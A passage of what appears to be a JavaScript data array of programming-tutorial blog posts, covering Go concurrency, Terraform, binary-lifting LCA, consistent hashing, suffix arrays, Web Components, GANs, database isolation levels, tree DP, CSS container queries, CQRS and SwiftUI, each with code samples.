<p><s>Never blindly add indexes to every column.</s> Every time you INSERT or UPDATE data, the database must also update the B-Tree, slowing down write operations. Index strictly based on your <code>WHERE</code>, <code>JOIN</code>, and <code>ORDER BY</code> clauses. Read more at <a href="https://use-the-index-luke.com/">Use The Index, Luke</a>.</p>
    `
  },
  {
    title: "Go (Golang) Concurrency: Demystifying Goroutines and Channels",
    tags: ["golang", "concurrency", "parallel-programming", "goroutines", "backend-dev"],
    content: `
<h2>Concurrency as a First-Class Citizen</h2>
<p>In languages like Java or C++, managing threads is a terrifying ordeal of mutexes, semaphores, and race conditions. Node.js avoids this by using a single thread with an event loop. <strong>Go (Golang)</strong> took a different approach based on Tony Hoare's <em>Communicating Sequential Processes (CSP)</em>.</p>
<hr>
<h3>Goroutines: Lightweight Threads</h3>
<p>A goroutine is a function that executes concurrently with other goroutines in the same address space. They are managed by the Go runtime, not the OS. While an OS thread might take 2MB of RAM to start, a goroutine takes about <strong>2KB</strong>. You can comfortably spawn a million goroutines on a standard laptop.</p>
<pre><code>package main

import (
    "fmt"
    "time"
)

func fetchAPI(id int) {
    time.Sleep(time.Millisecond * 500)
    fmt.Printf("Fetched data for ID: %d\\n", id)
}

func main() {
    // Spawning 5 concurrent tasks using the 'go' keyword
    for i := 1; i &lt;= 5; i++ {
        go fetchAPI(i) 
    }
    
    // We must wait; otherwise main exits before goroutines finish!
    time.Sleep(time.Second * 1) 
    fmt.Println("Done")
}</code></pre>
<h3>Channels: Connecting Goroutines</h3>
<p>If goroutines are running concurrently, how do they safely share data? Go's philosophy is: <em>"Do not communicate by sharing memory; instead, share memory by communicating."</em></p>
<p>A <strong>Channel</strong> is a typed conduit through which you can send and receive values.</p>
<pre><code>package main

import "fmt"

func calculateSum(arr []int, c chan int) {
    sum := 0
    for _, v := range arr {
        sum += v
    }
    c &lt;- sum // Send sum into the channel
}

func main() {
    numbers := []int{7, 2, 8, -9, 4, 0}
    
    // Create an unbuffered channel of integers
    c := make(chan int)

    // Split the work across two CPU cores
    go calculateSum(numbers[:len(numbers)/2], c)
    go calculateSum(numbers[len(numbers)/2:], c)

    // Receive the values (this blocks until data is ready!)
    x, y := &lt;-c, &lt;-c 

    fmt.Printf("Total Sum: %d\\n", x+y)
}</code></pre>
<blockquote>
  "Channels automatically handle synchronization. When you read from a channel, the goroutine blocks until another goroutine writes to it."
</blockquote>
<p>Go is arguably the best language for building highly concurrent microservices. For a hands-on tutorial, visit the <a href="https://go.dev/tour/concurrency/1">A Tour of Go: Concurrency</a> page.</p>
    `
  },
  {
    title: "Cloud Engineering: Infrastructure as Code (IaC) with Terraform",
    tags: ["terraform", "iac", "infrastructure", "devops-tools", "cloud-native"],
    content: `
<h2>Killing the UI Console</h2>
<p>In the early days of cloud computing, DevOps engineers would log into the AWS or Azure web console, click a bunch of buttons, and manually provision servers, databases, and VPCs. This is prone to human error, impossible to replicate, and untrackable.</p>
<p><strong>Infrastructure as Code (IaC)</strong> allows you to define your entire cloud infrastructure in plain text files. <strong>Terraform</strong> by HashiCorp is the industry standard tool for this.</p>
<hr>
<h3>Declarative vs Imperative</h3>
<p>Terraform uses HashiCorp Configuration Language (HCL). It is <strong>Declarative</strong>. You don't tell Terraform <em>how</em> to create a server; you simply declare that a server <em>must exist</em>. Terraform figures out the API calls required to make reality match your code.</p>
<h3>A Simple Terraform Configuration</h3>
<p>Here is how you provision an AWS EC2 instance (a virtual server) using Terraform:</p>
<pre><code># 1. Define the provider
provider "aws" {
  region = "us-east-1"
}

# 2. Declare a resource
resource "aws_instance" "web_server" {
  ami           = "ami-0c55b159cbfafe1f0" # Ubuntu Linux
  instance_type = "t2.micro"              # Free tier

  tags = {
    Name        = "Production-Web-Node"
    Environment = "Prod"
  }
}</code></pre>
<h3>The Terraform Workflow</h3>
<p>Working with Terraform revolves around three core CLI commands:</p>
<ol>
  <li><code>terraform init</code>: Initializes the directory, downloading required provider plugins (like the AWS SDK).</li>
  <li><code>terraform plan</code>: This is a dry run. It reads your code, compares it to reality, and outputs an execution plan (e.g., "+ 1 resource to add, - 0 to destroy").</li>
  <li><code>terraform apply</code>: Executes the plan, making the actual API calls to AWS to create your infrastructure.</li>
</ol>
<blockquote>
  "Terraform tracks the real-world state of your infrastructure in a file called terraform.tfstate. Never commit this file to public version control, as it can contain database passwords and secrets in plaintext!"
</blockquote>
<p>By keeping your infrastructure in version control, you can code review firewall rules just like you code review JavaScript. Start your IaC journey at the <a href="https://developer.hashicorp.com/terraform/tutorials">HashiCorp Developer Hub</a>.</p>
    `
  },
  {
    title: "Competitive Programming: Lowest Common Ancestor (LCA) via Binary Lifting",
    tags: ["lca", "binary-lifting", "tree-algorithms", "competitive-math", "cplusplus-cp"],
    content: `
<h2>Navigating Tree Structures</h2>
<p>Given a large tree (or organizational chart), finding the <strong>Lowest Common Ancestor (LCA)</strong> of two nodes <code>u</code> and <code>v</code> is a frequent problem. The LCA is the deepest node that has both <code>u</code> and <code>v</code> as descendants.</p>
<p>If we query the LCA once, a simple <code>O(N)</code> DFS works. But what if we have 100,000 queries? We need an algorithm that answers queries in <code>O(log N)</code> time. This is achieved using a dynamic programming technique called <strong>Binary Lifting</strong>.</p>
<hr>
<h3>The Intuition of Binary Lifting</h3>
<p>Instead of storing just the immediate parent of each node, what if we precompute and store the 1st, 2nd, 4th, 8th, 16th... ancestor of every node? Because any number can be formed by a sum of powers of 2 (binary representation), we can jump up the tree in massive logarithmic leaps rather than stepping one by one.</p>
<h3>1. Precomputing the up Matrix</h3>
<p>We use a 2D array <code>up[node][j]</code> which stores the <code>2^j</code>-th ancestor of <code>node</code>.</p>
<pre><code>const int LOG = 20; // log2(100000) is approx 17
vector&lt;int&gt; adj[MAXN];
int up[MAXN][LOG]; 
int depth[MAXN];

void dfs(int v, int parent, int d) {
    depth[v] = d;
    up[v][0] = parent; // 2^0 = 1st ancestor is the immediate parent
    
    // DP transition: The 2^j ancestor is the 2^(j-1) ancestor OF the 2^(j-1) ancestor.
    for (int j = 1; j &lt; LOG; j++) {
        if (up[v][j - 1] != -1)
            up[v][j] = up[ up[v][j - 1] ][j - 1];
        else
            up[v][j] = -1;
    }
    
    for (int child : adj[v]) {
        if (child != parent) {
            dfs(child, v, d + 1);
        }
    }
}</code></pre>
<h3>2. Querying the LCA</h3>
<p>To find the LCA of <code>u</code> and <code>v</code>:</p>
<ol>
  <li>Ensure both nodes are at the exact same depth. If <code>u</code> is deeper, "lift" it up using the binary representation of the depth difference.</li>
  <li>If <code>u == v</code> now, that node is the LCA.</li>
  <li>Otherwise, lift both <code>u</code> and <code>v</code> together in massive jumps, as long as they don't overshoot the LCA.</li>
  <li>The immediate parent of the final positions is the LCA.</li>
</ol>
<pre><code>int getLCA(int u, int v) {
    if (depth[u] &lt; depth[v]) swap(u, v);
    
    // 1. Equalize depth
    int diff = depth[u] - depth[v];
    for (int j = LOG - 1; j &gt;= 0; j--) {
        if ((diff &gt;&gt; j) &amp; 1) { // If the j-th bit is set
            u = up[u][j];
        }
    }
    
    if (u == v) return u;
    
    // 3. Jump together
    for (int j = LOG - 1; j &gt;= 0; j--) {
        if (up[u][j] != up[v][j]) {
            u = up[u][j];
            v = up[v][j];
        }
    }
    
    // 4. Return parent
    return up[u][0]; 
}</code></pre>
<blockquote>
  "Binary lifting is a beautiful application of binary numbers to tree traversal, reducing O(N) operations to a mere 20 operations."
</blockquote>
    `
  },
  {
    title: "System Design: Consistent Hashing Explained",
    tags: ["consistent-hashing", "distributed-systems", "load-balancing", "system-architecture", "scaling"],
    content: `
<h2>The Problem with Standard Hashing</h2>
<p>Imagine you are building a distributed cache (like Memcached or Redis) across 4 servers. A naive way to route requests is using a simple modulo hash: <code>server_index = hash(key) % N</code> (where N is the number of servers). But what happens if a server crashes, making N = 3?</p>
<hr>
<h3>The Rehashing Catastrophe</h3>
<p>If N changes, the modulo math completely breaks. Almost every single key will hash to a new server. This results in a massive cache miss storm, where requests bypass the cache and hit the database all at once, potentially crashing your entire application. <s>Standard modulo hashing is fine for distributed systems</s>—it is an absolute disaster waiting to happen.</p>
<h3>Enter Consistent Hashing</h3>
<p>Consistent Hashing solves this by placing both the <em>servers</em> and the <em>data keys</em> onto an abstract <strong>Hash Ring</strong>.</p>
<ol>
  <li>The hash function (e.g., SHA-1) produces an output range, say 0 to 359 (degrees of a circle).</li>
  <li>We hash the Server IPs and place them on this ring.</li>
  <li>We hash the Data Key and place it on the ring.</li>
  <li>To find the correct server, we move <em>clockwise</em> from the key's position until we find the first server.</li>
</ol>
<blockquote>
  "In Consistent Hashing, when a node is added or removed, only <code>K/N</code> keys need to be remapped (where K is total keys and N is total nodes), rather than nearly all of them."
</blockquote>
<h3>Virtual Nodes (VNodes)</h3>
<p>One issue with a basic hash ring is uneven distribution—servers might clump together. To fix this, we use <strong>Virtual Nodes</strong>. Instead of hashing Server A once, we hash it 100 times (e.g., <code>ServerA_01</code>, <code>ServerA_02</code>) and scatter it across the ring, ensuring perfectly uniform load distribution.</p>
<pre><code>class ConsistentHashRing {
  constructor(virtualNodes = 100) {
    this.ring = new Map(); // Stores Hash -&gt; Server mapping
    this.sortedKeys = []; // To easily find the next clockwise node
    this.virtualNodes = virtualNodes;
  }

  addNode(node) {
    for (let i = 0; i &lt; this.virtualNodes; i++) {
      const hash = this._hash(node + "#" + i);
      this.ring.set(hash, node);
      this.sortedKeys.push(hash);
    }
    this.sortedKeys.sort((a, b) =&gt; a - b);
  }

  getNode(key) {
    if (this.ring.size === 0) return null;
    const hash = this._hash(key);
    
    // Find first node clockwise
    for (let currentHash of this.sortedKeys) {
      if (hash &lt;= currentHash) {
        return this.ring.get(currentHash);
      }
    }
    // Wrap around to the first node
    return this.ring.get(this.sortedKeys[0]);
  }

  _hash(str) {
    // A simplistic string hash for demonstration
    let hash = 0;
    for (let i = 0; i &lt; str.length; i++) hash = (hash &lt;&lt; 5) - hash + str.charCodeAt(i);
    return hash;
  }
}</code></pre>
<p>Consistent hashing is the underlying magic behind Amazon DynamoDB, Apache Cassandra, and Discord's server routing. To learn more, read the original <a href="https://www.akamai.com/es/es/multimedia/documents/technical-publication/consistent-hashing-and-random-trees-distributed-caching-protocols-for-relieving-hot-spots-on-the-world-wide-web-technical-publication.pdf">1997 Akamai Paper</a>.</p>
    `
  },
  {
    title: "Advanced Strings: Suffix Arrays over Suffix Trees",
    tags: ["suffix-array", "string-algorithms", "pattern-matching", "cp-strings", "advanced-dsa"],
    content: `
<h2>The Ultimate String Data Structure</h2>
<p>If you need to perform complex substring searches—like finding the longest repeated substring, or counting all unique substrings in a text—standard string matching algorithms fall short. For decades, Suffix Trees were the answer, but they have a massive flaw: they consume an exorbitant amount of memory.</p>
<hr>
<h3>Why the Suffix Array?</h3>
<p>A <strong>Suffix Array</strong> is simply a sorted array of all suffixes of a given string. It is much easier to implement than a Suffix Tree, uses significantly less memory, and when paired with an <em>LCP (Longest Common Prefix) array</em>, it can solve almost any problem a Suffix Tree can.</p>
<ul>
  <li><strong>Memory:</strong> Suffix Tree uses <code>~20N</code> bytes. Suffix Array uses <code>4N</code> bytes.</li>
  <li><strong>Construction:</strong> <s>O(N^2) naive sorting</s> can be reduced to <code>O(N log N)</code> or even <code>O(N)</code> using algorithms like DC3.</li>
  <li><strong>Searching:</strong> We can find any pattern of length <em>P</em> in <code>O(P log N)</code> time using binary search.</li>
</ul>
<h3>Building the Suffix Array (O(N log^2 N) Method)</h3>
<p>Here is a robust implementation using pair sorting, widely used in competitive programming.</p>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;string&gt;
#include &lt;algorithm&gt;

using namespace std;

vector&lt;int&gt; buildSuffixArray(string s) {
    s += "$"; // Append lexicographically smallest character
    int n = s.size();
    vector&lt;int&gt; p(n), c(n);
    
    // Base case: length 1 substrings
    vector&lt;pair&lt;char, int&gt;&gt; a(n);
    for (int i = 0; i &lt; n; i++) a[i] = {s[i], i};
    sort(a.begin(), a.end());
    
    for (int i = 0; i &lt; n; i++) p[i] = a[i].second;
    c[p[0]] = 0;
    for (int i = 1; i &lt; n; i++) {
        if (a[i].first == a[i-1].first) c[p[i]] = c[p[i-1]];
        else c[p[i]] = c[p[i-1]] + 1;
    }
    
    // Transitions: length 2, 4, 8...
    int k = 0;
    while ((1 &lt;&lt; k) &lt; n) {
        vector&lt;pair&lt;pair&lt;int, int&gt;, int&gt;&gt; a(n);
        for (int i = 0; i &lt; n; i++) {
            a[i] = {{c[i], c[(i + (1 &lt;&lt; k)) % n]}, i};
        }
        sort(a.begin(), a.end());
        
        for (int i = 0; i &lt; n; i++) p[i] = a[i].second;
        c[p[0]] = 0;
        for (int i = 1; i &lt; n; i++) {
            if (a[i].first == a[i-1].first) c[p[i]] = c[p[i-1]];
            else c[p[i]] = c[p[i-1]] + 1;
        }
        k++;
    }
    return p;
}</code></pre>
<blockquote>
  "The Suffix Array is just a sorted list of pointers to the original string. Its true power is unlocked when you build the LCP array to measure the similarity between adjacent sorted suffixes."
</blockquote>
<p>If you want to master this, try solving <em>"Longest Common Substring of Two Strings"</em> using a concatenated Suffix Array. You can find excellent visual guides on <a href="https://visualgo.net/en/suffixarray">VisuAlgo</a>.</p>
    `
  },
  {
    title: "Vanilla Web Components and the Shadow DOM",
    tags: ["web-components", "shadow-dom", "custom-elements", "vanilla-js", "frontend-architecture"],
    content: `
<h2>Do We Really Need React for Everything?</h2>
<p>Modern frontend frameworks are amazing, but they come with a cost: massive JavaScript bundles, constant dependency updates, and vendor lock-in. What if you could build reusable, encapsulated UI components using just native browser APIs? Enter <strong>Web Components</strong>.</p>
<hr>
<h3>The Three Pillars of Web Components</h3>
<ol>
  <li><strong>Custom Elements:</strong> A set of JavaScript APIs that allow you to define custom HTML tags (e.g., <code>&lt;user-profile&gt;</code>).</li>
  <li><strong>Shadow DOM:</strong> A private, encapsulated DOM tree attached to your element. Styles defined inside the Shadow DOM <em>cannot leak out</em>, and global styles <em>cannot leak in</em>.</li>
  <li><strong>HTML Templates:</strong> The <code>&lt;template&gt;</code> and <code>&lt;slot&gt;</code> elements allow you to write markup that isn't rendered until instantiated.</li>
</ol>
<blockquote>
  "The Shadow DOM provides true CSS encapsulation—a feature that CSS-in-JS libraries have spent years trying to emulate in userland."
</blockquote>
<h3>Building a Custom Element</h3>
<p>Let's build a totally encapsulated button component without any external libraries.</p>
<pre><code>// 1. Define the template
const template = document.createElement('template');
template.innerHTML = \`
  &lt;style&gt;
    button {
      background: #6366f1;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover { background: #4f46e5; }
  &lt;/style&gt;
  &lt;button&gt;
    &lt;slot&gt;Default Text&lt;/slot&gt; &lt;!-- Content injection point --&gt;
  &lt;/button&gt;
\`;

// 2. Create the class
class PrimaryButton extends HTMLElement {
  constructor() {
    super();
    // Attach the Shadow DOM
    const shadowRoot = this.attachShadow({ mode: 'open' });
    // Clone template and attach
    shadowRoot.appendChild(template.content.cloneNode(true));
  }
}

// 3. Register the custom element (must contain a hyphen)
window.customElements.define('primary-button', PrimaryButton);</code></pre>
<h3>Using It In HTML</h3>
<p>Now, you can use it anywhere in your application, just like a standard HTML tag. <s>You don't need a build step, Webpack, or Babel.</s></p>
<pre><code>&lt;primary-button&gt;Click Me!&lt;/primary-button&gt;
&lt;primary-button&gt;Submit Form&lt;/primary-button&gt;</code></pre>
<p>If you want to build framework-agnostic component libraries (design systems that work in React, Vue, and plain HTML equally well), Web Components are the absolute best choice. Read the <a href="https://developer.mozilla.org/en-US/docs/Web/Web_Components">MDN Web Components Guide</a> to get started.</p>
    `
  },
  {
    title: "AI Explained: Generative Adversarial Networks (GANs)",
    tags: ["gans", "generative-ai", "neural-networks", "deep-fakes", "pytorch-gans"],
    content: `
<h2>The Art of Neural Duels</h2>
<p>Before diffusion models (like Midjourney and DALL-E) took over the AI art scene, the undisputed king of generative imagery was the <strong>Generative Adversarial Network (GAN)</strong>. Invented by Ian Goodfellow in 2014, GANs introduced a fascinating concept: pitting two neural networks against each other in a zero-sum game.</p>
<hr>
<h3>The Generator vs. The Discriminator</h3>
<p>A GAN consists of two distinct models:</p>
<ul>
  <li><strong>The Generator:</strong> The counterfeiter. It takes random noise as input and tries to generate fake data (e.g., images of human faces) that look as realistic as possible.</li>
  <li><strong>The Discriminator:</strong> The detective. It looks at a mix of real images (from the dataset) and fake images (from the Generator) and tries to classify them as "Real" or "Fake".</li>
</ul>
<blockquote>
  "This is a mathematically formalized <em>minimax game</em>. The Generator improves its fakes to fool the Discriminator, while the Discriminator improves its detection to catch the Generator. They train each other."
</blockquote>
<h3>The Loss Function</h3>
<p>Training a GAN is notoriously difficult because you must maintain a delicate balance. If the Discriminator gets too good too fast, the Generator's loss drops to zero and it stops learning (Vanishing Gradient). If the Generator finds one specific image that fools the Discriminator and only produces that one image, it causes <s>Mode Collapse</s>.</p>
<h3>A PyTorch GAN Snippet</h3>
<p>Here is what the core training loop of a GAN looks like:</p>
<pre><code>import torch
import torch.nn as nn

# Assume generator (G), discriminator (D), and optimizers are defined
criterion = nn.BCELoss() # Binary Cross Entropy Loss

for epoch in range(num_epochs):
    for real_images in dataloader:
        batch_size = real_images.size(0)
        
        # 1. Train Discriminator: Maximize log(D(x)) + log(1 - D(G(z)))
        D.zero_grad()
        
        # Train on Real Data
        real_labels = torch.ones(batch_size, 1)
        output = D(real_images)
        lossD_real = criterion(output, real_labels)
        
        # Train on Fake Data
        noise = torch.randn(batch_size, 100) # 100-dim random noise
        fake_images = G(noise)
        fake_labels = torch.zeros(batch_size, 1)
        output = D(fake_images.detach()) # Detach prevents gradients flowing back to G
        lossD_fake = criterion(output, fake_labels)
        
        lossD = lossD_real + lossD_fake
        lossD.backward()
        optimizerD.step()
        
        # 2. Train Generator: Maximize log(D(G(z)))
        G.zero_grad()
        # We want to fool D, so we use real labels for the fake images here!
        output = D(fake_images)
        lossG = criterion(output, real_labels)
        
        lossG.backward()
        optimizerG.step()</code></pre>
<p>While Diffusion models are better for text-to-image generation, GANs are still heavily used for high-speed video generation, deep fakes, and super-resolution upscaling. Learn more at <a href="https://developers.google.com/machine-learning/gan">Google's GAN Course</a>.</p>
    `
  },
  {
    title: "Database Architecture: ACID Properties and Isolation Levels",
    tags: ["acid-properties", "database-transactions", "isolation-levels", "rdbms-internals", "data-engineering"],
    content: `
<h2>Keeping Your Data Safe</h2>
<p>When you transfer money from your checking account to your savings account, two things happen: money is deducted from checking, and money is added to savings. What happens if the database server unplugs exactly between those two steps? If you are using a relational database like PostgreSQL, the <strong>ACID</strong> properties save you.</p>
<hr>
<h3>The 4 Pillars of ACID</h3>
<ul>
  <li><strong>Atomicity:</strong> All or nothing. A transaction is treated as a single unit. If step 2 fails, step 1 is rolled back entirely.</li>
  <li><strong>Consistency:</strong> The database must go from one valid state to another. Constraints (like <code>balance &gt;= 0</code>) are strictly enforced.</li>
  <li><strong>Isolation:</strong> Concurrent transactions execute as if they were running sequentially. One transaction cannot see the intermediate states of another.</li>
  <li><strong>Durability:</strong> Once a transaction is committed, it remains committed even in the event of a total power loss (achieved via Write-Ahead Logging).</li>
</ul>
<blockquote>
  "The 'I' in ACID is the most misunderstood. Total isolation severely limits database performance. Databases offer different <em>Isolation Levels</em> to trade strict safety for higher throughput."
</blockquote>
<h3>Understanding Isolation Levels</h3>
<p>If isolation is too low, you encounter Read Phenomena:</p>
<ol>
  <li><strong>Dirty Read:</strong> Transaction A reads data written by Transaction B before B has committed. If B rolls back, A has read data that <s>technically never existed</s>.</li>
  <li><strong>Non-Repeatable Read:</strong> Transaction A reads a row. Transaction B modifies that row and commits. Transaction A reads the same row again and gets a different value.</li>
  <li><strong>Phantom Read:</strong> Transaction A runs a query (e.g., <code>COUNT(*)</code>). Transaction B inserts a new row. Transaction A runs the query again and gets a different count.</li>
</ol>
<h3>SQL Configuration</h3>
<p>You can set the isolation level when starting a transaction in SQL:</p>
<pre><code>-- 1. Read Uncommitted (Fastest, allows Dirty Reads)
SET TRANSACTION ISOLATION LEVEL READ UNCOMMITTED;

-- 2. Read Committed (Default in Postgres, prevents Dirty Reads)
SET TRANSACTION ISOLATION LEVEL READ COMMITTED;

-- 3. Repeatable Read (Prevents Dirty &amp; Non-Repeatable Reads)
SET TRANSACTION ISOLATION LEVEL REPEATABLE READ;

-- 4. Serializable (Slowest, prevents ALL anomalies via strict locking)
SET TRANSACTION ISOLATION LEVEL SERIALIZABLE;

BEGIN;
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
COMMIT;</code></pre>
<p>Always understand your database's default isolation level. To dive deep into the math and anomalies of database concurrency, read Martin Kleppmann's masterpiece, <a href="https://dataintensive.net/">Designing Data-Intensive Applications</a>.</p>
    `
  },
  {
    title: "Dynamic Programming on Trees (Tree DP)",
    tags: ["tree-dp", "dynamic-programming", "graph-theory", "competitive-coding", "algorithm-design"],
    content: `
<h2>Merging Graphs and DP</h2>
<p>Dynamic Programming is usually taught on arrays or matrices (like the Knapsack problem). However, many advanced competitive programming problems require running DP on a Tree structure. This is known as <strong>Tree DP</strong>, and it relies heavily on Post-Order Traversal.</p>
<hr>
<h3>The Maximum Independent Set Problem</h3>
<p>Imagine a corporate hierarchy (a Tree). You are organizing a company party, and you want to invite the maximum number of people. However, to avoid awkwardness, <strong>you cannot invite an employee and their direct manager</strong> simultaneously. What is the maximum number of people you can invite?</p>
<p>This is the classic Maximum Independent Set on a Tree.</p>
<h3>The State Definition</h3>
<p>For any node <code>u</code>, we can make one of two choices: we include <code>u</code>, or we don't.</p>
<ul>
  <li><code>dp[u][0]</code>: Max guests from the subtree of <code>u</code> if node <code>u</code> is <strong>NOT</strong> invited.</li>
  <li><code>dp[u][1]</code>: Max guests from the subtree of <code>u</code> if node <code>u</code> <strong>IS</strong> invited.</li>
</ul>
<h3>The Transitions</h3>
<ol>
  <li>If we do <s>not</s> invite <code>u</code>, we can either invite or not invite its children. We should greedily take the maximum of both options for each child.</li>
  <li>If we <strong>do</strong> invite <code>u</code>, we absolutely <strong>cannot</strong> invite any of its children.</li>
</ol>
<h3>C++ Implementation</h3>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
#include &lt;algorithm&gt;

using namespace std;

const int MAXN = 100005;
vector&lt;int&gt; adj[MAXN];
int dp[MAXN][2];

// Run DFS to calculate DP from the leaves up to the root
void dfs(int u, int parent) {
    // Base case constraints
    dp[u][0] = 0; 
    dp[u][1] = 1; // Include self
    
    for (int child : adj[u]) {
        if (child == parent) continue; // Prevent infinite loops
        
        dfs(child, u); // Solve for children first (Post-Order)
        
        // Transition 1: If we DON'T take u, we can take the best of child
        dp[u][0] += max(dp[child][0], dp[child][1]);
        
        // Transition 2: If we DO take u, we CANNOT take the child
        dp[u][1] += dp[child][0];
    }
}

int main() {
    // Assume input reading and tree construction...
    int root = 1;
    dfs(root, 0);
    
    int max_guests = max(dp[root][0], dp[root][1]);
    cout &lt;&lt; "Max guests: " &lt;&lt; max_guests &lt;&lt; endl;
    return 0;
}</code></pre>
<blockquote>
  "Tree DP is naturally elegant because the recursive substructure of a tree perfectly matches the overlapping subproblems required by DP."
</blockquote>
<p>Practice this pattern on Codeforces. Problems involving "Diameter of a Tree" or "Distance Sums" can all be solved using variations of this Post-Order DP approach.</p>
    `
  },
  {
    title: "CSS Container Queries: The End of Media Queries?",
    tags: ["container-queries", "responsive-design", "modern-css", "css-architecture", "ui-ux"],
    content: `
<h2>Responsive Components, Not Responsive Pages</h2>
<p>For over a decade, we have relied on <strong>Media Queries</strong> (<code>@media (max-width: 768px)</code>) to build responsive websites. Media queries respond to the size of the <em>viewport</em> (the browser window). But in a component-driven world (React, Vue), a component shouldn't care about the viewport—it should care about the space it is placed in.</p>
<hr>
<h3>The Problem with Viewport Queries</h3>
<p>Imagine a "Product Card" component. If you place it in a wide main content area, it should show a horizontal layout. If you place that exact same component in a narrow sidebar, it should show a stacked, vertical layout. <s>Media queries cannot solve this elegantly</s> because the browser window size is identical in both scenarios.</p>
<h3>Enter Container Queries</h3>
<p>CSS Container Queries allow elements to change their styling based on the size of their <strong>parent container</strong>, rather than the viewport.</p>
<h3>How to Use Them</h3>
<p>First, you must declare a container. You define the <code>container-type</code> on the parent element. This creates a containment context.</p>
<pre><code>.sidebar {
  /* Establish a container named 'sidebar-container' that tracks inline-size (width) */
  container-type: inline-size;
  container-name: sidebar-container;
  width: 300px;
}

.main-content {
  container-type: inline-size;
  container-name: main-container;
  width: 800px;
}</code></pre>
<p>Next, you write styles for your child component using the <code>@container</code> rule.</p>
<pre><code>/* Default vertical stack */
.product-card {
  display: flex;
  flex-direction: column;
}

/* If the parent container is wider than 500px, switch to horizontal! */
@container (min-width: 500px) {
  .product-card {
    flex-direction: row;
    align-items: center;
  }
  .product-card__title {
    font-size: 1.5rem;
  }
}</code></pre>
<blockquote>
  "Container queries represent the biggest shift in CSS layout since the introduction of Flexbox and Grid. They finally allow for truly modular, drop-anywhere UI components."
</blockquote>
<p>Container queries are now supported in all major modern browsers. To see interactive examples and polyfill strategies, check out the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/CSS_Container_Queries">MDN Documentation on Container Queries</a>.</p>
    `
  },
  {
    title: "Software Architecture: Event Sourcing and CQRS",
    tags: ["event-sourcing", "cqrs", "microservices-patterns", "software-architecture", "domain-driven-design"],
    content: `
<h2>Rethinking State in Distributed Systems</h2>
<p>In traditional CRUD (Create, Read, Update, Delete) applications, your database stores the <em>current state</em> of an entity. When you update a user's address, the old address is overwritten and lost forever. What if, instead, we stored every single change as an immutable fact?</p>
<hr>
<h3>What is Event Sourcing?</h3>
<p>Event Sourcing is an architectural pattern where state is determined by a sequence of events. You do not store the current state; you store the history.</p>
<blockquote>
  "Event Sourcing is like an accountant's ledger. You don't just erase a mistake with an eraser. You write a new transaction that reverses the previous one. The history is immutable."
</blockquote>
<ul>
  <li>Instead of storing: <code>{ cart_id: 1, total: 50 }</code></li>
  <li>You store: <code>[CartCreated, ItemAdded(shirt, $30), ItemAdded(hat, $20)]</code></li>
</ul>
<p>To get the current state, you "replay" the events from the beginning (or from a recent snapshot).</p>
<h3>The Complexity: How Do We Query?</h3>
<p>If the database is just a massive log of events, how do you quickly run a query like: <em>"Find all users living in New York?"</em> Replaying events for millions of users to find their current address is terribly inefficient. <s>Event sourcing makes querying incredibly difficult.</s></p>
<h3>The Solution: CQRS</h3>
<p><strong>Command Query Responsibility Segregation (CQRS)</strong> is a pattern that pairs perfectly with Event Sourcing. It separates the application into two completely distinct models:</p>
<ol>
  <li><strong>The Command Model (Write Side):</strong> Handles complex business logic, validations, and appends new events to the Event Store.</li>
  <li><strong>The Query Model (Read Side):</strong> A separate service listens to the Event Store, processes the events, and updates highly optimized Read Databases (like a standard SQL table or an Elasticsearch index).</li>
</ol>
<pre><code>// 1. The Command
const command = new UpdateUserAddressCommand(userId, 'New York');
commandBus.dispatch(command);

// 2. The Event is Saved
eventStore.save({ type: 'USER_MOVED', userId, newCity: 'New York' });

// 3. The Projector (Read Side) listens and updates SQL
eventStore.on('USER_MOVED', async (event) =&gt; {
  // Update a flat, highly indexed SQL table optimized purely for fast reads
  await sql.query('UPDATE users_read_model SET city = ? WHERE id = ?', [event.newCity, event.userId]);
});</code></pre>
<p>CQRS is complex and introduces <strong>Eventual Consistency</strong> (the read database might be a few milliseconds behind the write database). Do not use this for simple apps. Use it for complex domains like banking, e-commerce, or audit-heavy systems. Learn more from <a href="https://martinfowler.com/bliki/CQRS.html">Martin Fowler's architectural writings</a>.</p>
    `
  },
  {
    title: "iOS Development: The Shift from UIKit to SwiftUI",
    tags: ["swiftui", "ios-development", "declarative-ui", "apple-dev", "mobile-app-design"],
    content: `
<h2>The Declarative Revolution at Apple</h2>
<p>For over a decade, iOS developers built interfaces using UIKit, an imperative framework that relied heavily on visual Storyboards or massive ViewControllers. You had to manually update UI elements when data changed. In 2019, Apple introduced <strong>SwiftUI</strong>, completely shifting the paradigm.</p>
<hr>
<h3>Imperative vs Declarative</h3>
<p>In UIKit (Imperative), you tell the app <em>how</em> to build the UI: <s>"Create a label, set its text color to red, add constraints, and append it to the subview."</s></p>
<p>In SwiftUI (Declarative), you tell the app <em>what</em> the UI should look like based on the current state: "This UI is a Vertical Stack containing a Text label bound to a variable."</p>
<h3>The Power of @State</h3>
<p>SwiftUI uses Property Wrappers to handle state management automatically. When a variable marked with <code>@State</code> changes, SwiftUI automatically re-renders the views that depend on it. No more <code>myLabel.text = newValue</code>!</p>
<pre><code>import SwiftUI

struct CounterView: View {
    // @State tells SwiftUI to watch this variable for changes
    @State private var count = 0
    
    var body: some View {
        // VStack stacks elements vertically
        VStack(spacing: 20) {
            Text("You tapped the button \\(count) times")
                .font(.headline)
                .foregroundColor(count &gt; 10 ? .red : .primary)
            
            Button(action: {
                // Modifying state triggers a UI re-render instantly
                count += 1
            }) {
                Text("Tap Me")
                    .padding()
                    .background(Color.blue)
                    .foregroundColor(.white)
                    .cornerRadius(10)
            }
        }
        .padding()
    }
}</code></pre>
<blockquote>
  "SwiftUI is to iOS what React is to the Web. It brings one-way data flow and state-driven rendering to the Apple ecosystem."
</blockquote>
<h3>Layouts: Stacks Instead of Constraints</h3>
<p>UIKit's AutoLayout constraints were notoriously difficult to debug in code. SwiftUI replaces them with a CSS-Flexbox-like model using <code>VStack</code> (Vertical), <code>HStack</code> (Horizontal), and <code>ZStack</code> (Depth layer).</p>
<p>While UIKit is still required for deeply complex custom controls, SwiftUI is undeniably the future of Apple development across iOS, macOS, and visionOS. Start building today using Apple's <a href="https://developer.apple.com/tutorials/swiftui">official SwiftUI Tutorials</a>.</p>
    `
  },
  {
